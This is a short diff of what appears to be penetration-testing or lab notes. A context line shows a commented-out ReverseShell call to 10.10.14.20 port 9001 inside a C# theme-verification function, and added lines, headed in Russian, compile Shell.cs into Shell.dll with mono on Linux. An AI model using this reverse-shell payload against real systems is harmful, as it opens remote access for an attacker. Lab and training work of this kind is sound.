@@ -65,3 +65,10 @@ void VerifyThemeVersion() {
 //        ReverseShell("10.10.14.20", 9001);
 }
 -----------------------------------------
+
+
+# Компиляция C# из линукс
+
+sudo apt install mono-devel
+
+mcs -target:library -out:Shell.dll Shell.cs
